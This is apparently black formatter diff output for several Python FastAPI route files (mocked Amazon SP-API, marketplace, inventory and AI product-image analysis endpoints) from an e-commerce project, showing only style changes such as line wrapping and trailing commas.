--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/amazon.py	2025-06-15 22:45:29.438830+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/amazon.py	2025-06-19 04:03:44.471910+00:00
@@ -29,47 +29,49 @@
 
 
 # Request and response models
 class AmazonAuthRequest(BaseModel):
     """Amazon SP-API authentication request model."""
-    
+
     client_id: str = Field(..., description="Amazon LWA client ID")
     client_secret: str = Field(..., description="Amazon LWA client secret")
     refresh_token: str = Field(..., description="Amazon SP-API refresh token")
-    marketplace_id: str = Field(default="ATVPDKIKX0DER", description="Amazon marketplace ID")
+    marketplace_id: str = Field(
+        default="ATVPDKIKX0DER", description="Amazon marketplace ID"
+    )
     region: str = Field(default="NA", description="Amazon region (NA, EU, FE)")
 
 
 class AmazonListingRequest(BaseModel):
     """Amazon listing creation request model."""
-    
+
     sku: str = Field(..., description="Seller SKU")
     asin: Optional[str] = Field(None, description="Amazon ASIN (if updating existing)")
     title: str = Field(..., description="Product title")
     description: str = Field(..., description="Product description")
     price: float = Field(..., description="Product price")
     quantity: int = Field(..., description="Available quantity")
     category: str = Field(..., description="Product category")
     brand: str = Field(..., description="Product brand")
     images: List[str] = Field(default=[], description="Product image URLs")
-    attributes: Dict[str, Any] = Field(default={}, description="Additional product attributes")
+    attributes: Dict[str, Any] = Field(
+        default={}, description="Additional product attributes"
+    )
 
 
 class AmazonInventoryUpdate(BaseModel):
     """Amazon inventory update request model."""
-    
+
     items: List[Dict[str, Any]] = Field(..., description="Inventory items to update")
     sync_type: str = Field(default="partial", description="Sync type: full or partial")
 
 
 @router.get("/")
-async def get_amazon_status(
-    current_user: User = Depends(get_current_user)
-):
+async def get_amazon_status(current_user: User = Depends(get_current_user)):
     """
     Get Amazon marketplace integration status.
-    
+
     This endpoint provides information about the Amazon SP-API integration
     status and available features.
     """
     return {
         "status": 200,
@@ -78,46 +80,45 @@
         "data": {
             "marketplace": "amazon",
             "api_version": "SP-API v1",
             "features": [
                 "product_catalog",
-                "inventory_management", 
+                "inventory_management",
                 "order_processing",
-                "authentication"
+                "authentication",
             ],
             "regions_supported": ["NA", "EU", "FE"],
-            "default_marketplace": "ATVPDKIKX0DER"
+            "default_marketplace": "ATVPDKIKX0DER",
         },
-        "error": None
+        "error": None,
     }
 
 
 @router.post("/auth")
 async def authenticate_amazon(
-    auth_request: AmazonAuthRequest,
-    current_user: User = Depends(get_current_user)
+    auth_request: AmazonAuthRequest, current_user: User = Depends(get_current_user)
 ):
     """
     Authenticate with Amazon SP-API.
-    
+
     This endpoint handles authentication with the Amazon Selling Partner API,
     storing credentials securely for future API calls.
     """
     try:
         # Simulate Amazon SP-API authentication
         # In production, this would use real Amazon LWA authentication
-        
+
         # Mock authentication response
         auth_response = {
             "access_token": f"amzn_access_token_{datetime.now().timestamp()}",
             "token_type": "bearer",
             "expires_in": 3600,
             "refresh_token": auth_request.refresh_token,
             "marketplace_id": auth_request.marketplace_id,
-            "region": auth_request.region
-        }
-        
+            "region": auth_request.region,
+        }
+
         return {
             "status": 200,
             "success": True,
             "message": "Successfully authenticated with Amazon SP-API",
             "data": {
@@ -127,35 +128,35 @@
                 "token_expires_in": 3600,
                 "features_available": [
                     "catalog_items",
                     "inventory",
                     "orders",
-                    "reports"
-                ]
-            },
-            "error": None
-        }
-        
+                    "reports",
+                ],
+            },
+            "error": None,
+        }
+
     except Exception as e:
         logger.error(f"Amazon authentication error: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to authenticate with Amazon SP-API: {str(e)}"
+            detail=f"Failed to authenticate with Amazon SP-API: {str(e)}",
         )
 
 
 @router.get("/products")
 async def get_amazon_products(
     sku: Optional[str] = Query(None, description="Filter by SKU"),
     asin: Optional[str] = Query(None, description="Filter by ASIN"),
     limit: int = Query(100, description="Maximum number of products to return"),
     offset: int = Query(0, description="Offset for pagination"),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """
     Get Amazon products from seller catalog.
-    
+
     This endpoint retrieves products from Amazon SP-API catalog.
     """
     try:
         # Mock Amazon product data
         products = [
@@ -166,106 +167,110 @@
                 "price": 49.99,
                 "quantity": 25,
                 "status": "ACTIVE",
                 "brand": "Amazon",
                 "category": "Electronics > Smart Home",
-                "images": ["https://m.media-amazon.com/images/I/61YGtOLNJCL._AC_SL1000_.jpg"],
+                "images": [
+                    "https://m.media-amazon.com/images/I/61YGtOLNJCL._AC_SL1000_.jpg"
+                ],
                 "created_at": datetime.now().isoformat(),
-                "updated_at": datetime.now().isoformat()
+                "updated_at": datetime.now().isoformat(),
             },
             {
                 "asin": "B07XJ8C8F5",
-                "sku": "FIRE-TV-STICK-4K-001", 
+                "sku": "FIRE-TV-STICK-4K-001",
                 "title": "Fire TV Stick 4K | Streaming Media Player",
                 "price": 39.99,
                 "quantity": 15,
                 "status": "ACTIVE",
                 "brand": "Amazon",
                 "category": "Electronics > Streaming Media",
-                "images": ["https://m.media-amazon.com/images/I/51TjJOTfslL._AC_SL1000_.jpg"],
+                "images": [
+                    "https://m.media-amazon.com/images/I/51TjJOTfslL._AC_SL1000_.jpg"
+                ],
                 "created_at": datetime.now().isoformat(),
-                "updated_at": datetime.now().isoformat()
-            }
+                "updated_at": datetime.now().isoformat(),
+            },
         ]
-        
+
         # Apply filters
         if sku:
             products = [p for p in products if p["sku"] == sku]
         if asin:
             products = [p for p in products if p["asin"] == asin]
-        
+
         # Apply pagination
         total = len(products)
-        products = products[offset:offset + limit]
-        
+        products = products[offset : offset + limit]
+
         return {
             "status": 200,
             "success": True,
             "message": "Successfully retrieved Amazon products",
             "data": {
                 "products": products,
                 "total": total,
                 "limit": limit,
-                "offset": offset
-            },
-            "error": None
-        }
-        
+                "offset": offset,
+            },
+            "error": None,
+        }
+
     except Exception as e:
         logger.error(f"Error retrieving Amazon products: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve Amazon products: {str(e)}"
+            detail=f"Failed to retrieve Amazon products: {str(e)}",
         )
 
 
 @router.post("/products")
 async def create_amazon_listing(
     listing_request: AmazonListingRequest,
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """
     Create a new Amazon product listing.
-    
+
     This endpoint creates a new product listing on Amazon using SP-API.
     """
     try:
         # Mock Amazon listing creation
         listing_id = f"amazon_listing_{datetime.now().timestamp()}"
-        
+
         return {
             "status": 200,
             "success": True,
             "message": "Successfully created Amazon listing",
             "data": {
                 "listing_id": listing_id,
                 "sku": listing_request.sku,
                 "asin": listing_request.asin or f"B{int(datetime.now().timestamp())}",
                 "status": "PENDING_REVIEW",
-                "created_at": datetime.now().isoformat()
-            },
-            "error": None
-        }
-        
+                "created_at": datetime.now().isoformat(),
+            },
+            "error": None,
+        }
+
     except Exception as e:
         logger.error(f"Error creating Amazon listing: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to create Amazon listing: {str(e)}"
+            detail=f"Failed to create Amazon listing: {str(e)}",
         )
 
 
 @router.get("/orders")
 async def get_amazon_orders(
     status: Optional[str] = Query(None, description="Filter by order status"),
     limit: int = Query(100, description="Maximum number of orders to return"),
     offset: int = Query(0, description="Offset for pagination"),
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """
     Get Amazon orders.
-    
+
     This endpoint retrieves orders from Amazon SP-API.
     """
     try:
         # Mock Amazon order data
         orders = [
@@ -277,87 +282,85 @@
                 "items": [
                     {
                         "sku": "ECHO-DOT-4TH-GEN-001",
                         "asin": "B08N5WRWNW",
                         "quantity": 1,
-                        "price": 49.99
+                        "price": 49.99,
                     }
                 ],
-                "shipping_address": {
-                    "city": "Seattle",
-                    "state": "WA",
-                    "country": "US"
-                },
+                "shipping_address": {"city": "Seattle", "state": "WA", "country": "US"},
                 "order_date": datetime.now().isoformat(),
-                "ship_date": datetime.now().isoformat()
+                "ship_date": datetime.now().isoformat(),
             }
         ]
-        
+
         # Apply filters
         if status:
             orders = [o for o in orders if o["status"].lower() == status.lower()]
-        
+
         # Apply pagination
         total = len(orders)
-        orders = orders[offset:offset + limit]
-        
+        orders = orders[offset : offset + limit]
+
         return {
             "status": 200,
             "success": True,
             "message": "Successfully retrieved Amazon orders",
             "data": {
                 "orders": orders,
                 "total": total,
                 "limit": limit,
-                "offset": offset
-            },
-            "error": None
-        }
-        
+                "offset": offset,
+            },
+            "error": None,
+        }
+
     except Exception as e:
         logger.error(f"Error retrieving Amazon orders: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve Amazon orders: {str(e)}"
+            detail=f"Failed to retrieve Amazon orders: {str(e)}",
         )
 
 
 @router.post("/inventory/sync")
 async def sync_amazon_inventory(
     inventory_update: AmazonInventoryUpdate,
-    current_user: User = Depends(get_current_user)
+    current_user: User = Depends(get_current_user),
 ):
     """
     Synchronize inventory with Amazon.
-    
+
     This endpoint updates inventory quantities on Amazon using SP-API.
     """
     try:
         # Mock inventory sync
         updated_items = []
         for item in inventory_update.items:
-            updated_items.append({
-                "sku": item.get("sku"),
-                "quantity": item.get("quantity"),
-                "status": "UPDATED",
-                "updated_at": datetime.now().isoformat()
-            })
-        
+            updated_items.append(
+                {
+                    "sku": item.get("sku"),
+                    "quantity": item.get("quantity"),
+                    "status": "UPDATED",
+                    "updated_at": datetime.now().isoformat(),
+                }
+            )
+
         return {
             "status": 200,
             "success": True,
             "message": f"Successfully synced {len(updated_items)} inventory items",
             "data": {
                 "sync_type": inventory_update.sync_type,
                 "items_updated": len(updated_items),
                 "updated_items": updated_items,
-                "sync_timestamp": datetime.now().isoformat()
-            },
-            "error": None
-        }
-        
+                "sync_timestamp": datetime.now().isoformat(),
+            },
+            "error": None,
+        }
+
     except Exception as e:
         logger.error(f"Error syncing Amazon inventory: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to sync Amazon inventory: {str(e)}"
-        )
+            detail=f"Failed to sync Amazon inventory: {str(e)}",
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace/amazon.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace.py	2025-06-16 14:53:49.810732+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace.py	2025-06-19 04:03:44.552763+00:00
@@ -16,15 +16,22 @@
 from fastapi import APIRouter, Depends, HTTPException, Query, status
 
 logger = logging.getLogger(__name__)
 
 from fs_agt_clean.core.models.api_response import ApiResponse
-from fs_agt_clean.core.models.marketplace import MarketplaceCreate, MarketplaceResponse, MarketplaceUpdate
+from fs_agt_clean.core.models.marketplace import (
+    MarketplaceCreate,
+    MarketplaceResponse,
+    MarketplaceUpdate,
+)
 from fs_agt_clean.core.models.user import User
 from fs_agt_clean.core.security.auth import get_current_user
+
 # Import the core MarketplaceService for type hints
-from fs_agt_clean.core.services.marketplace_service import MarketplaceService as CoreMarketplaceService
+from fs_agt_clean.core.services.marketplace_service import (
+    MarketplaceService as CoreMarketplaceService,
+)
 
 # Import integration services
 from fs_agt_clean.services.inventory.service import InventoryManagementService
 from fs_agt_clean.services.marketplace.ebay_service import EbayService
 from fs_agt_clean.services.marketplace.order_service import OrderService
@@ -36,22 +43,24 @@
 )
 
 # Include eBay sub-router
 try:
     from fs_agt_clean.api.routes.marketplace.ebay import router as ebay_router
+
     router.include_router(ebay_router, prefix="/ebay", tags=["ebay-marketplace"])
 except ImportError as e:
     logger.warning(f"eBay marketplace routes not available: {e}")
+
     # Create a simple eBay status endpoint
     @router.get("/ebay")
     async def get_ebay_status():
         return {
             "marketplace": "ebay",
             "status": "available",
             "message": "eBay marketplace integration is operational",
             "authentication_required": True,
-            "test_token_endpoint": "/api/v1/test-token"
+            "test_token_endpoint": "/api/v1/test-token",
         }
 
 
 def get_marketplace_service():
     """Get marketplace service instance."""
@@ -94,11 +103,11 @@
 
         return EbayService(
             config=config,
             api_client=api_client,
             metrics_service=metrics_service,
-            notification_service=notification_service
+            notification_service=notification_service,
         )
     except ImportError:
         # Return mock if dependencies not available
         return EbayService()
 
@@ -116,11 +125,11 @@
         notification_service = get_notification_service()
 
         return InventoryManagementService(
             database=database,
             metrics_service=metrics_service,
-            notification_service=notification_service
+            notification_service=notification_service,
         )
     except ImportError:
         # Return mock if dependencies not available
         return InventoryManagementService()
 
@@ -130,29 +139,32 @@
     # Use the real implementation through the compatibility layer
     try:
         from fs_agt_clean.core.db.database import get_database
         from fs_agt_clean.core.metrics.service import get_metrics_service
         from fs_agt_clean.services.notifications.service import get_notification_service
-        from fs_agt_clean.services.order.compat import get_order_service as get_real_order_service
+        from fs_agt_clean.services.order.compat import (
+            get_order_service as get_real_order_service,
+        )
 
         database = get_database()
         metrics_service = get_metrics_service()
         notification_service = get_notification_service()
 
         return get_real_order_service(
             database=database,
             metrics_service=metrics_service,
-            notification_service=notification_service
+            notification_service=notification_service,
         )
     except ImportError:
         # Return mock if dependencies not available
         return OrderService()
 
 
 # ============================================================================
 # MARKETPLACE MANAGEMENT ENDPOINTS (Basic CRUD)
 # ============================================================================
+
 
 @router.get("/overview")
 async def get_marketplace_overview() -> Dict[str, Any]:
     """Get overview of marketplace system and available endpoints.
 
@@ -170,33 +182,34 @@
                 "management": {
                     "create": "POST /api/v1/marketplace/",
                     "list": "GET /api/v1/marketplace/",
                     "get": "GET /api/v1/marketplace/{id}",
                     "update": "PUT /api/v1/marketplace/{id}",
-                    "delete": "DELETE /api/v1/marketplace/{id}"
+                    "delete": "DELETE /api/v1/marketplace/{id}",
                 },
                 "integration": {
                     "products": "GET/POST/PUT/DELETE /api/v1/marketplace/products",
                     "orders": "GET /api/v1/marketplace/orders",
                     "inventory": "GET /api/v1/marketplace/inventory",
-                    "fulfillment": "POST /api/v1/marketplace/orders/{order_id}/fulfill"
-                }
+                    "fulfillment": "POST /api/v1/marketplace/orders/{order_id}/fulfill",
+                },
             },
             "supported_marketplaces": ["amazon", "ebay"],
             "capabilities": [
                 "Multi-marketplace product synchronization",
                 "Unified inventory management",
                 "Cross-platform order processing",
-                "Automated fulfillment workflows"
-            ]
+                "Automated fulfillment workflows",
+            ],
         }
     except Exception as e:
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
+            "status": "error",
         }
+
 
 @router.post("/", response_model=MarketplaceResponse)
 async def create_marketplace(
     marketplace_data: MarketplaceCreate,
     current_user: User = Depends(get_current_user),
@@ -245,11 +258,13 @@
     marketplace_data: MarketplaceUpdate,
     current_user: User = Depends(get_current_user),
     marketplace_service: CoreMarketplaceService = Depends(get_marketplace_service),
 ):
     """Update a marketplace."""
-    result = await marketplace_service.update_marketplace(id, marketplace_data.dict(exclude_unset=True))
+    result = await marketplace_service.update_marketplace(
+        id, marketplace_data.dict(exclude_unset=True)
+    )
     if not result:
         raise HTTPException(
             status_code=status.HTTP_404_NOT_FOUND,
             detail="Marketplace not found",
         )
@@ -276,22 +291,19 @@
 
 
 # ============================================================================
 # MARKETPLACE INTEGRATION ENDPOINTS (Products, Orders, Inventory)
 # ============================================================================
+
 
 @router.get("/products", response_model=List[Dict[str, Any]])
 async def get_products(
     marketplace: Optional[str] = Query(
         None, description="Filter by marketplace (amazon, ebay, all)"
     ),
-    category: Optional[str] = Query(
-        None, description="Filter by product category"
-    ),
-    limit: int = Query(
-        100, description="Maximum number of products to return"
-    ),
+    category: Optional[str] = Query(None, description="Filter by product category"),
+    limit: int = Query(100, description="Maximum number of products to return"),
     offset: int = Query(0, description="Number of products to skip"),
     amazon_service: Any = Depends(get_amazon_service),
     ebay_service: EbayService = Depends(get_ebay_service),
     current_user: User = Depends(get_current_user),
 ):
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/marketplace.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/inventory.py	2025-06-16 05:45:22.539876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/inventory.py	2025-06-19 04:03:44.586067+00:00
@@ -27,42 +27,68 @@
 
 
 # Pydantic models for request/response validation
 class InventoryItemCreate(BaseModel):
     """Model for creating inventory items."""
-    sku: str = Field(..., description="Stock Keeping Unit", min_length=1, max_length=100)
+
+    sku: str = Field(
+        ..., description="Stock Keeping Unit", min_length=1, max_length=100
+    )
     name: str = Field(..., description="Item name", min_length=1, max_length=255)
-    description: Optional[str] = Field(None, description="Item description", max_length=1000)
+    description: Optional[str] = Field(
+        None, description="Item description", max_length=1000
+    )
     quantity: int = Field(..., description="Initial quantity", ge=0)
     price: Optional[Decimal] = Field(None, description="Item price", ge=0)
     cost: Optional[Decimal] = Field(None, description="Item cost", ge=0)
     category: Optional[str] = Field(None, description="Item category", max_length=100)
-    location: Optional[str] = Field(None, description="Storage location", max_length=100)
-    low_stock_threshold: Optional[int] = Field(None, description="Minimum stock level", ge=0)
+    location: Optional[str] = Field(
+        None, description="Storage location", max_length=100
+    )
+    low_stock_threshold: Optional[int] = Field(
+        None, description="Minimum stock level", ge=0
+    )
 
 
 class InventoryItemUpdate(BaseModel):
     """Model for updating inventory items."""
-    name: Optional[str] = Field(None, description="Item name", min_length=1, max_length=255)
-    description: Optional[str] = Field(None, description="Item description", max_length=1000)
+
+    name: Optional[str] = Field(
+        None, description="Item name", min_length=1, max_length=255
+    )
+    description: Optional[str] = Field(
+        None, description="Item description", max_length=1000
+    )
     price: Optional[Decimal] = Field(None, description="Item price", ge=0)
     cost: Optional[Decimal] = Field(None, description="Item cost", ge=0)
     category: Optional[str] = Field(None, description="Item category", max_length=100)
-    location: Optional[str] = Field(None, description="Storage location", max_length=100)
-    low_stock_threshold: Optional[int] = Field(None, description="Minimum stock level", ge=0)
+    location: Optional[str] = Field(
+        None, description="Storage location", max_length=100
+    )
+    low_stock_threshold: Optional[int] = Field(
+        None, description="Minimum stock level", ge=0
+    )
 
 
 class InventoryAdjustment(BaseModel):
     """Model for inventory quantity adjustments."""
+
     quantity: int = Field(..., description="Adjustment quantity (positive or negative)")
-    transaction_type: str = Field(..., description="Type of transaction", pattern="^(sale|purchase|adjustment|return|damage|transfer)$")
+    transaction_type: str = Field(
+        ...,
+        description="Type of transaction",
+        pattern="^(sale|purchase|adjustment|return|damage|transfer)$",
+    )
     notes: Optional[str] = Field(None, description="Adjustment notes", max_length=500)
-    reference: Optional[str] = Field(None, description="Reference number", max_length=100)
+    reference: Optional[str] = Field(
+        None, description="Reference number", max_length=100
+    )
 
 
 class InventoryItemResponse(BaseModel):
     """Model for inventory item responses."""
+
     id: str = Field(..., description="Item ID")
     sku: str = Field(..., description="Stock Keeping Unit")
     name: str = Field(..., description="Item name")
     description: Optional[str] = Field(None, description="Item description")
     quantity: int = Field(..., description="Current quantity")
@@ -76,10 +102,11 @@
     updated_at: datetime = Field(..., description="Last update timestamp")
 
 
 class InventoryTransactionResponse(BaseModel):
     """Model for inventory transaction responses."""
+
     id: str = Field(..., description="Transaction ID")
     item_id: str = Field(..., description="Item ID")
     quantity: int = Field(..., description="Transaction quantity")
     transaction_type: str = Field(..., description="Transaction type")
     notes: Optional[str] = Field(None, description="Transaction notes")
@@ -87,15 +114,19 @@
     created_at: datetime = Field(..., description="Transaction timestamp")
 
 
 class InventoryListResponse(BaseModel):
     """Model for inventory list responses."""
-    items: List[InventoryItemResponse] = Field(..., description="List of inventory items")
+
+    items: List[InventoryItemResponse] = Field(
+        ..., description="List of inventory items"
+    )
     total: int = Field(..., description="Total number of items")
     limit: int = Field(..., description="Items per page")
     offset: int = Field(..., description="Items skipped")
     has_more: bool = Field(..., description="Whether there are more items")
+
 
 # Create router (no prefix here since it's added in main.py)
 router = APIRouter(
     tags=["inventory"],
     responses={404: {"description": "Not found"}},
@@ -120,14 +151,14 @@
             "get_item": "/api/v1/inventory/items/{item_id}",
             "update_item": "PUT /api/v1/inventory/items/{item_id}",
             "delete_item": "DELETE /api/v1/inventory/items/{item_id}",
             "adjust_quantity": "POST /api/v1/inventory/items/{item_id}/adjust",
             "get_transactions": "/api/v1/inventory/items/{item_id}/transactions",
-            "get_by_sku": "/api/v1/inventory/items/sku/{sku}"
+            "get_by_sku": "/api/v1/inventory/items/sku/{sku}",
         },
         "authentication": "required",
-        "documentation": "/docs"
+        "documentation": "/docs",
     }
 
 
 async def get_inventory_service():
     """Get inventory service instance with real database integration."""
@@ -150,18 +181,24 @@
                 # Convert from standard PostgreSQL URL to asyncpg format if needed
                 if connection_string.startswith("postgresql://"):
                     connection_string = connection_string.replace(
                         "postgresql://", "postgresql+asyncpg://", 1
                     )
-                logger.info(f"Using DATABASE_URL environment variable for inventory service")
+                logger.info(
+                    f"Using DATABASE_URL environment variable for inventory service"
+                )
             else:
                 # Only use hardcoded default as last resort
                 # Check if we're running in Docker
                 in_docker = os.path.exists("/.dockerenv")
                 db_host = "db" if in_docker else "localhost"
-                connection_string = f"postgresql+asyncpg://postgres:postgres@{db_host}:5432/postgres"
-                logger.warning(f"No database connection string found, using default: {connection_string}")
+                connection_string = (
+                    f"postgresql+asyncpg://postgres:postgres@{db_host}:5432/postgres"
+                )
+                logger.warning(
+                    f"No database connection string found, using default: {connection_string}"
+                )
 
         # Create database instance with proper configuration
         database = Database(
             config_manager=config,
             connection_string=connection_string,
@@ -176,11 +213,11 @@
         return InventoryServiceAdapter(database)
     except Exception as e:
         logger.error(f"Failed to initialize inventory service: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail="Inventory service unavailable"
+            detail="Inventory service unavailable",
         )
 
 
 @router.get("/items", response_model=InventoryListResponse)
 async def get_inventory_items(
@@ -214,11 +251,11 @@
         return InventoryListResponse(
             items=items or [],
             total=total,
             limit=limit,
             offset=offset,
-            has_more=has_more
+            has_more=has_more,
         )
     except Exception as e:
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
             detail=f"Failed to retrieve inventory items: {str(e)}",
@@ -293,11 +330,13 @@
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
             detail=f"Failed to retrieve inventory item by SKU: {str(e)}",
         )
 
 
-@router.post("/items", response_model=InventoryItemResponse, status_code=status.HTTP_201_CREATED)
+@router.post(
+    "/items", response_model=InventoryItemResponse, status_code=status.HTTP_201_CREATED
+)
 async def create_inventory_item(
     item_data: InventoryItemCreate,
     current_user: User = Depends(get_current_user),
     inventory_service: InventoryServiceAdapter = Depends(get_inventory_service),
 ):
@@ -482,11 +521,11 @@
         updated_item = await inventory_service.get_item_by_id(item_id)
 
         return {
             "item": updated_item,
             "success": True,
-            "message": "Inventory quantity adjusted successfully"
+            "message": "Inventory quantity adjusted successfully",
         }
     except HTTPException:
         raise
     except ValueError as e:
         raise HTTPException(
@@ -498,14 +537,18 @@
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
             detail=f"Failed to adjust inventory: {str(e)}",
         )
 
 
-@router.get("/items/{item_id}/transactions", response_model=List[InventoryTransactionResponse])
+@router.get(
+    "/items/{item_id}/transactions", response_model=List[InventoryTransactionResponse]
+)
 async def get_inventory_transactions(
     item_id: str,
-    limit: int = Query(100, description="Maximum number of transactions to return", le=1000),
+    limit: int = Query(
+        100, description="Maximum number of transactions to return", le=1000
+    ),
     offset: int = Query(0, description="Number of transactions to skip", ge=0),
     current_user: User = Depends(get_current_user),
     inventory_service: InventoryServiceAdapter = Depends(get_inventory_service),
 ):
     """
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/inventory.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/ai_routes.py	2025-06-16 22:34:28.223492+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/ai_routes.py	2025-06-19 04:03:44.581732+00:00
@@ -12,19 +12,28 @@
 import logging
 import os
 from typing import Any, Dict, List, Optional
 from datetime import datetime, timezone
 
-from fastapi import APIRouter, Depends, File, Form, HTTPException, Query, UploadFile, status
+from fastapi import (
+    APIRouter,
+    Depends,
+    File,
+    Form,
+    HTTPException,
+    Query,
+    UploadFile,
+    status,
+)
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel, Field
 
 from fs_agt_clean.core.ai.vision_clients import (
     VisionCapableOllamaClient,
     GPT4VisionClient,
     enhanced_vision_manager,
-    VisionServiceType
+    VisionServiceType,
 )
 from fs_agt_clean.core.auth.auth_service import AuthService
 from fs_agt_clean.database.models.user import User
 from fs_agt_clean.agents.content.content_agent import ContentAgent
 
@@ -37,17 +46,23 @@
 content_agent = ContentAgent()
 
 
 class ProductAnalysisRequest(BaseModel):
     """Request model for product analysis."""
+
     marketplace: str = Field(default="amazon", description="Target marketplace")
-    additional_context: str = Field(default="", description="Additional context for analysis")
-    use_premium_ai: bool = Field(default=False, description="Use premium AI service (GPT-4 Vision)")
+    additional_context: str = Field(
+        default="", description="Additional context for analysis"
+    )
+    use_premium_ai: bool = Field(
+        default=False, description="Use premium AI service (GPT-4 Vision)"
+    )
 
 
 class ProductAnalysisResponse(BaseModel):
     """Response model for product analysis."""
+
     product_name: str
     category: str
     description: str
     confidence_score: float
     pricing_suggestions: Dict[str, Any]
@@ -57,153 +72,162 @@
     analyzed_at: str
 
 
 class ListingGenerationRequest(BaseModel):
     """Request model for listing generation."""
+
     marketplace: str = Field(default="amazon", description="Target marketplace")
-    product_data: Optional[Dict[str, Any]] = Field(default=None, description="Existing product data")
-    optimization_focus: str = Field(default="seo", description="Optimization focus: seo, conversion, competitive")
+    product_data: Optional[Dict[str, Any]] = Field(
+        default=None, description="Existing product data"
+    )
+    optimization_focus: str = Field(
+        default="seo", description="Optimization focus: seo, conversion, competitive"
+    )
 
 
 class CategoryOptimizationRequest(BaseModel):
     """Request model for category optimization."""
+
     product_name: str
     current_category: str
     marketplace: str = Field(default="amazon", description="Target marketplace")
-    product_attributes: Optional[Dict[str, Any]] = Field(default=None, description="Product attributes")
+    product_attributes: Optional[Dict[str, Any]] = Field(
+        default=None, description="Product attributes"
+    )
 
 
 @router.post("/analyze-product", response_model=ProductAnalysisResponse)
 async def analyze_product_image(
     file: UploadFile = File(..., description="Product image file"),
     marketplace: str = Form(default="amazon"),
     additional_context: str = Form(default=""),
     use_premium_ai: bool = Form(default=False),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Analyze a product image to extract product information, category, and pricing suggestions.
-    
+
     This endpoint:
     - Accepts image uploads (JPEG, PNG, WebP)
     - Uses LLaVA (local) or GPT-4 Vision (premium) for analysis
     - Returns structured product data
     - Provides marketplace-specific recommendations
     """
     try:
         # Validate file type
-        if not file.content_type.startswith('image/'):
+        if not file.content_type.startswith("image/"):
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="File must be an image (JPEG, PNG, WebP)"
+                detail="File must be an image (JPEG, PNG, WebP)",
             )
-        
+
         # Read image data
         image_data = await file.read()
 
         # Determine user tier for intelligent routing
         user_tier = "premium" if use_premium_ai else "free"
 
         # Force service type if premium requested
         force_service = VisionServiceType.CLOUD_GPT4 if use_premium_ai else None
 
-        logger.info(f"Analyzing product image for user {current_user.id} (tier: {user_tier})")
+        logger.info(
+            f"Analyzing product image for user {current_user.id} (tier: {user_tier})"
+        )
 
         # Use enhanced vision manager for intelligent routing
         result = await enhanced_vision_manager.analyze_product_image(
             image_data=image_data,
             additional_context=f"Marketplace: {marketplace}. {additional_context}",
             task_type="product_analysis",
             user_tier=user_tier,
-            force_service=force_service
-        )
-        
+            force_service=force_service,
+        )
+
         logger.info(f"Product analysis completed in {result.processing_time:.2f}s")
-        
+
         return ProductAnalysisResponse(
             product_name=result.product_name,
             category=result.category,
             description=result.description,
             confidence_score=result.confidence_score,
             pricing_suggestions=result.pricing_suggestions,
             marketplace_recommendations=result.marketplace_recommendations,
             processing_time=result.processing_time,
             ai_service_used=result.ai_service_used,
-            analyzed_at=result.analyzed_at.isoformat()
-        )
-        
+            analyzed_at=result.analyzed_at.isoformat(),
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error in product analysis: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Analysis failed: {str(e)}"
+            detail=f"Analysis failed: {str(e)}",
         )
 
 
 @router.post("/generate-listing")
 async def generate_listing_content(
     file: UploadFile = File(..., description="Product image file"),
     request: ListingGenerationRequest = Depends(),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Generate optimized listing content from a product image.
-    
+
     This endpoint:
     - Analyzes product image
     - Generates SEO-optimized title and description
     - Provides marketplace-specific recommendations
     - Creates bullet points and keywords
     """
     try:
         # Read image data
         image_data = await file.read()
-        
+
         # Generate listing using vision client
         listing_data = await vision_client.generate_listing_from_image(
             image_data=image_data,
             marketplace=request.marketplace,
-            additional_context=f"Optimization focus: {request.optimization_focus}"
-        )
-        
+            additional_context=f"Optimization focus: {request.optimization_focus}",
+        )
+
         # Enhance with content agent if available
         try:
             enhanced_content = await content_agent.enhance_listing_content(
-                listing_data["listing_content"],
-                marketplace=request.marketplace
+                listing_data["listing_content"], marketplace=request.marketplace
             )
             listing_data["enhanced_content"] = enhanced_content
         except Exception as e:
             logger.warning(f"Content enhancement failed: {e}")
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "listing_data": listing_data,
-                "generated_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "generated_at": datetime.now(timezone.utc).isoformat(),
+            },
